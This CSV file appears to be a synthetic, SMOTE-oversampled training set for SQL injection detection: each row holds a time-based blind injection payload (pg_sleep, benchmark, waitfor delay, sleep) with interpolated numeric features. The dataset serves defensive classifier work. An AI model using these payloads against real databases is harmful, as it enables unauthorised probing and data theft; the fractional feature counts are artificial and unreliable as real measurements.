id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000411,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.34193058607810717,70.48994540406622,24.0,3.4523264271062004,19.0,10.0,30.591956323252976,10.897989080813245,0.2696737168849214,0.14193353520259022,0.4338114791773172,0.1545812687351711,0.10201091918675609,0.897989080813244,2.0,0.0,0.0,1.0,0.0,4.897989080813244,1.0,1.0,0.0,3.0,0.10201091918675598,0.897989080813244,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000412,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.05064608381939609,65.24700264424263,23.049400528848526,3.4959599319557895,19.061750661060657,10.09880105769705,27.074100793272788,9.01235013221213,0.29218474981508286,0.1545614556213361,0.41504931767749875,0.13820447688608234,0.0,1.0,2.0,0.0,0.0,1.0123501322121313,0.0,4.0,0.0,1.0,0.0,3.0123501322121315,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.012350132212131326,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0123501322121315
SMOTE_000413,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,1.745163041382757,63.56286271067697,22.375241807117977,3.3745321495691534,18.187620903558987,7.562862710676967,27.54158606429401,10.270793032147004,0.28593529721744576,0.1152366591700984,0.43608383494288316,0.16274420866957273,1.5415860642940071,-1.1102230246251565e-16,1.4584139357059926,0.0,0.0,1.0,0.0,4.270793032147004,1.0,1.0,0.0,2.458413935705993,1.0,0.0,0.7292069678529963,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7292069678529963,0.27079303214700373,0.7292069678529963,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7292069678529964
SMOTE_000414,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.14378971845983818,71.7269005478026,25.902464481358074,3.6017669671866046,15.0,20.78542185898776,27.941478688814843,8.0,0.20931429400932974,0.2893403884921609,0.3897110273602002,0.11163429013830918,0.9804928962716144,-1.1102230246251565e-16,0.03901420745677109,0.0,0.0,1.0,0.0,4.980492896271614,0.0,0.0,1.0,1.0390142074567714,0.9804928962716144,0.0,0.019507103728385544,0.0,0.0,1.0,1.0,0.0,0.0,0.9804928962716145,0.0,0.0,0.0,0.0,0.0,0.0195071037283856,0.9804928962716144,0.0,0.0,0.0,0.0,0.0,0.0,0.019507103728385544,0.9804928962716145,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000415,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.1479994736588082,68.39808422890658,21.742720302064757,3.3890863845128707,15.0,15.941762416518047,28.71360151032378,8.742720302064756,0.22127124917777807,0.23003864412571384,0.42036321405079374,0.12832689264571437,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.742720302064756,0.0,4.0,0.0,0.0,1.0,3.7427203020647557,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7427203020647559,0.0,0.257279697935244,0.7427203020647559,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7427203020647557
SMOTE_000416,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,0.24975782444222625,64.78777415976742,24.973471769970928,3.914888842829219,22.86735884985464,11.946943539941856,21.026528230029072,8.946943539941856,0.35283657748067504,0.18437194066909895,0.3247452301205867,0.13804625172963936,1.9469435399418564,0.026528230029071675,2.0,0.0,0.0,1.0,0.0,2.0265282300290717,0.0,0.0,0.0,3.0,0.9734717699709282,0.026528230029071787,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.026528230029071787,0.0,0.0,0.0,0.0,0.0,0.0,0.026528230029071787,0.0,0.9734717699709282,0.9734717699709282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000417,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,3.96483812600481,61.63097200435486,24.57887150054436,3.804402851779605,20.894357502721785,11.157743001088715,21.42112849945564,8.157743001088715,0.3378194012352913,0.1807507776028362,0.34956084760409306,0.1318689735577794,1.1577430010887149,0.42112849945564246,2.0,0.0,0.0,1.0,0.0,2.4211284994556426,0.0,0.0,0.0,3.0,0.5788715005443574,0.4211284994556425,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.4211284994556425,0.0,0.0,0.0,0.0,0.0,0.0,0.42112849945564257,0.0,0.5788715005443573,0.5788715005443573,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000418,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,0.8027562297397679,80.28762900166087,25.547938166943478,3.280070313908247,19.849312722314494,10.0,38.8903781124029,11.54793816694348,0.24870071842796765,0.12550949211925694,0.48213319634130586,0.14365659311146955,0.8493127223144931,0.15068727768550688,2.0,0.0,0.0,1.0,0.0,6.547938166943479,0.0,1.0,0.0,3.0,0.8493127223144931,0.15068727768550694,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.8493127223144931,0.150687277685507,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000419,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.2291655474588987,75.92874935211236,22.0,3.31912701556493,15.0,18.0,33.14299948168989,9.785749870422473,0.1977036002377912,0.23724432028534945,0.43622537556246416,0.12882670391439516,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.785749870422474,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000420,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,2.8696663475840967,95.23086185995612,23.326853605032905,3.088711919722543,33.30741442013163,1.5577154649890321,47.2503010448574,13.115430929978062,0.3512199386624539,0.016255035626208156,0.4949610378864309,0.13756398782490703,1.326853605032907,0.557715464989031,0.0,0.0,1.0,0.0,0.0,9.673146394967095,0.0,0.0,0.0,1.0000000000000002,0.44228453501096887,0.557715464989031,0.0,0.557715464989031,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000421,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,1.6869995640525333,83.67597433045093,22.335992665843122,3.1800617239044153,32.007977997529366,1.6660018335392195,39.33399816646078,10.667996332921561,0.3797064081328697,0.020452184046372196,0.47244084065098896,0.12740056716976916,1.0019944993823404,0.6660018335392196,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.3339981664607803,0.6660018335392196,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000422,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.2606090952746865,97.55434415542925,27.96286201295244,3.6409287573430245,30.185689935237814,17.7028961036195,38.7028961036195,10.962862012952439,0.3098679744886602,0.18117057704757766,0.39656672948421573,0.1123947189795464,0.0,1.1114139611426874,1.9257240259048751,0.0,0.0,1.9628620129524377,0.0,4.962862012952438,0.0,1.0,0.0,3.888586038857312,0.0,1.0,0.9628620129524376,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9628620129524377,1.0,0.0742759740951251,0.9628620129524377,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000423,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,0.6386012208944615,74.22296244302487,24.477475917485165,3.4641144841051346,20.313058773084208,10.954951834970334,31.954951834970334,11.0,0.2722033467191012,0.14595745269512,0.43200484974836484,0.14983435083741395,0.0,1.0,2.0,0.0,0.0,1.1193689793712918,0.0,5.0,0.8806310206287085,1.0,0.0,3.1193689793712918,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.1193689793712916,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1193689793712918
SMOTE_000424,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,1.7963449188767824,71.25897132289381,18.645420377969664,2.9513739881695757,22.7936261133909,3.3808783401726963,34.76175668034539,10.322710188984832,0.32914989190664645,0.0391346002274382,0.48677415605164615,0.14494135181426923,0.0,3.264542037796966,0.0,0.0,0.0,1.0,0.0,5.793626113390899,0.0,0.0,0.2645420377969663,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7354579622030337,0.0,0.0,0.0,1.0,0.2645420377969663,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000425,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,1.7552516379331369,73.28853676682547,26.644268383412733,3.7570000599735516,17.577073533650935,21.644268383412737,26.067194849761798,8.0,0.23953101406165267,0.2952943039606573,0.35599831075670724,0.10917637122098278,0.3557316165872657,-1.1102230246251565e-16,1.2885367668254686,0.0,0.0,1.0,0.0,4.355731616587265,0.0,0.0,1.0,2.2885367668254686,0.35573161658726565,0.0,0.6442683834127343,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.6442683834127343,0.3557316165872657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000426,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,0.40274939019825834,73.84578324709098,26.69156649418195,3.813144074082338,18.845783247090974,21.76867487063646,25.231325129363537,8.0,0.2551648045401658,0.29472122916499566,0.3417743015006808,0.1083396647941577,0.0,-1.1102230246251565e-16,1.8457832470909752,0.0,0.0,1.0,0.0,4.077108376454513,0.0,0.0,1.0,2.845783247090975,0.0,0.0,0.9228916235454876,0.07710837645451239,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9228916235454876,0.0771083764545124,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000427,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,2.016468410047281,64.35006676758591,25.225011127930987,3.6561879442027014,21.062527819827466,10.0,25.67503338379296,7.6125055639654935,0.3265351853327279,0.15675040231989343,0.3981122384920693,0.11860217385530936,0.0,0.38749443603450673,2.0,0.0,0.0,1.0,0.0,3.6125055639654935,0.0,0.6125055639654933,0.0,3.0,0.0,0.38749443603450673,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6125055639654932,0.0,0.38749443603450673,0.6125055639654933,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3874944360345068,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000428,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,2.0339094652027656,59.840374499809016,19.89358299987268,3.1007817454912607,16.94679149993634,3.8403744998090206,28.368805666709108,10.684402833354554,0.2829668058212193,0.05982481977387165,0.47731288211269474,0.17989549229221433,2.3688056667091066,-1.1102230246251565e-16,0.6311943332908934,0.0,0.0,1.0,0.0,4.684402833354554,1.0,1.0,0.0,1.6311943332908936,1.0,0.0,0.3155971666454467,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.3155971666454467,0.6844028333545533,0.3155971666454467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3155971666454467
SMOTE_000429,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,0.8071003149886683,70.52317207839812,23.0,3.509381562895907,17.454408591262116,17.977580669660234,27.318387113106823,7.772795704368941,0.24972304454757635,0.2531651456511235,0.3870703987637816,0.11004141103751855,0.11360214781552946,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.772795704368941,0.0,0.0,0.8863978521844708,1.0000000000000002,0.11360214781552935,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.8863978521844709,0.0,0.0,0.0,0.11360214781552921,0.0,0.0,0.8863978521844708,0.0,0.0,0.0,0.0,0.0,0.0,0.11360214781552924,0.8863978521844709,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000430,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.5478660698471602,60.20015629093844,21.115797699523075,3.328385422296783,15.0,10.926381596184605,26.04217929570768,8.231595399046151,0.25123100215761834,0.17951826459232484,0.43225313297751555,0.13699760027254126,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.1157976995230756,0.0,4.115797699523076,0.0,0.0,1.0,3.1157976995230756,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.11579769952307564,0.0,0.8842023004769244,0.11579769952307556,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1157976995230756
SMOTE_000431,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,1.858761402043411,72.75341926377864,26.37670963188932,3.694755526391007,16.506838527557274,21.37670963188932,26.869871104332045,8.0,0.22657490334599178,0.2937877794588363,0.36965746623988466,0.10997985095528733,0.6232903681106816,-1.1102230246251565e-16,0.7534192637786368,0.0,0.0,1.0,0.0,4.623290368110681,0.0,0.0,1.0,1.753419263778637,0.6232903681106816,0.0,0.3767096318893184,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.3767096318893184,0.6232903681106816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000432,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,2.5027745325552018,65.25768821432922,24.742311785670786,3.8273434810046596,21.969247142683148,11.484623571341574,22.546129285975283,9.257688214329214,0.3368471411060216,0.17608584465390484,0.34524171354020505,0.1418253006998685,1.7423117856707866,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,2.5153764286584264,0.2576882143292132,0.2576882143292132,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2576882143292132,0.0,0.7423117856707868,0.2576882143292132,0.0,0.2576882143292132,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7423117856707867,0.7423117856707867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000433,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,0.15956961000274936,57.22284052409911,18.14856034939941,2.9082892665503737,16.074280174699705,1.222840524099114,28.95047988353353,10.975239941766764,0.2808794581531891,0.020860996637307408,0.5063038219464479,0.19195572326305563,2.9504798835335295,-1.1102230246251565e-16,0.04952011646647003,0.0,0.0,1.0,0.0,4.975239941766765,1.0,1.0,0.0,1.04952011646647,1.0,0.0,0.024760058233235016,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.02476005823323496,0.975239941766765,0.024760058233235016,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.024760058233235
SMOTE_000434,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.343829484096798,73.65106954275174,24.310768112538142,3.530816416117509,21.88368984758391,12.097228980061027,30.145843470091542,9.524307245015256,0.29592928081329223,0.1616654926650627,0.4108164753377792,0.13158875118386595,0.0,1.0,2.0,0.0,0.0,1.2621536225076282,0.0,4.262153622507628,0.0,1.0,0.0,3.262153622507628,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.26215362250762825,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.262153622507628
SMOTE_000435,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.4199846439044383,94.58404149323908,24.735993084460155,3.2977373091435545,37.359930844601536,1.2640069155398468,43.43208990201801,12.528013831079694,0.39655826097734104,0.013247377175189173,0.45789320095124486,0.13230116089622487,2.4719861689203064,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.79202074661954,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,0.0,0.2640069155398468,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7359930844601532,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.735993084460153
SMOTE_000436,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.4414930921781886,88.83902839050273,27.535611356201095,3.6291277876287227,26.393165931396712,16.142445424804382,36.07122271240219,10.232194321899453,0.2979619900736125,0.18087811466710396,0.40579947629641777,0.1153604189628658,0.9287772875978084,-1.1102230246251565e-16,1.5356113562010956,0.0,0.0,2.0,0.0,4.767805678100548,0.0,1.0,0.0,3.5356113562010956,0.2321943218994521,0.0,0.7678056781005478,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.767805678100548,1.0,1.2321943218994522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000437,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,0.5420278499246386,94.20620451789401,25.201772719398285,3.1932670596897226,24.760531815819487,9.281595447458459,46.563190894916914,13.600886359699143,0.2654832845339441,0.09615109963826578,0.493969354830068,0.14439626099772213,0.0,3.9201772719398287,0.0,0.0,0.0,1.0,0.0,7.760531815819486,0.0,0.0,0.9201772719398287,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.07982272806017121,0.0,0.0,0.0,1.0,0.9201772719398287,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000438,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.05715310305556822,72.21495570115881,26.018691800100765,3.6093028121159216,15.046729500251915,21.08411310045345,28.056075400302298,8.028037700151149,0.20835382872818067,0.2918921160099873,0.38859922064171326,0.11115483462011874,1.0,-1.1102230246251565e-16,0.0186918001007661,0.0,0.0,1.009345900050383,0.0,5.0,0.0,0.0,1.0,1.0280377001511494,1.0,0.0,0.00934590005038305,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.009345900050383105,0.0,0.00934590005038305,0.990654099949617,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0093459000503833
SMOTE_000439,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,0.5907284199612732,70.9190882366403,23.0,3.5054242385566097,17.332588234879907,18.251676471520206,27.50111764768014,7.8337058825600465,0.24607388250670156,0.25604002576584023,0.3875579096061774,0.11032818212128082,0.08314705871997718,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.8337058825600465,0.0,0.0,0.916852941280023,1.0000000000000002,0.08314705871997707,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.916852941280023,0.0,0.0,0.0,0.08314705871997696,0.0,0.0,0.916852941280023,0.0,0.0,0.0,0.0,0.0,0.0,0.08314705871997702,0.916852941280023,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000440,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,0.026149158084892973,58.99106349354423,23.004468253227888,3.6246391760349117,20.986595240316337,10.0,22.0,6.004468253227887,0.35575283550824716,0.16951809844322263,0.3729398165750898,0.10178924947344038,0.9955317467721126,0.004468253227887242,0.008936506455774706,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0089365064557747,0.9955317467721126,0.004468253227887353,0.004468253227887353,0.9955317467721128,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.004468253227887353,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0044682532278872
